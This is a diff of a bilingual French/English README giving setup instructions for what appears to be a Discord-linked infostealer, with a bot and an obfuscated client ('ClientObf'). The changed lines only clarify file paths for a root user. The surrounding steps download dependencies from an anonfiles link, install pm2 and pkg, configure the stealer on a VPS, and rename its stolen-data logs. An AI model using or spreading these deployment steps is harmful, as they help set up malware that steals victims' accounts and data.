@@ -30,7 +30,7 @@ Setup the src on your vps
 Unzip node_modules.zip in Stealer/bot
 Install https://anonfiles.com/5dwb0204z6/node_modules_zip and put him on ClientObf and unzip
 
-Changer vos directories dans Stealer/Bot/index.js et mettez les nouvelles (ex: /home/vshell/ClientObf/link.txt votre nom de vps est lolita, alors cela fera /home/lolita/ClientObf/link.txt)
+Changer vos directories dans Stealer/Bot/index.js et mettez les nouvelles (ex: /home/vshell/ClientObf/link.txt votre nom de vps est lolita, alors cela fera /home/lolita/ClientObf/link.txt si c'est root votre user alors cela sera /root/a/ClientObf/link.txt )
 
 Pour modifier le nom des logs allez dans Stealer/ClientObf/Utils dans discord.js Modifier les émojis et le nom et dans stats.js c'est de même.
 
@@ -75,7 +75,7 @@ Install https://anonfiles.com/5dwb0204z6/node_modules_zip and put him on ClientO
 - sudo npm i pm2 -g
 - sudo npm install -g pkg
 
-Change your directories in Stealer/Bot/index.js and put the new ones (ex: /home/vshell/ClientObf/link.txt your vps name is lolita, then this will do /home/lolita/ClientObf/link.txt)
+Change your directories in Stealer/Bot/index.js and put the new ones (ex: /home/vshell/ClientObf/link.txt your vps name is lolita, then this will do /home/lolita/ClientObf/link.txt if your user are root  /root/a/ClientObf/link.txt )
 
 To modify the name of the logs go to Stealer/ClientObf/Utils in discord.js Modify emojis and name and in stats.js it's the same.
 
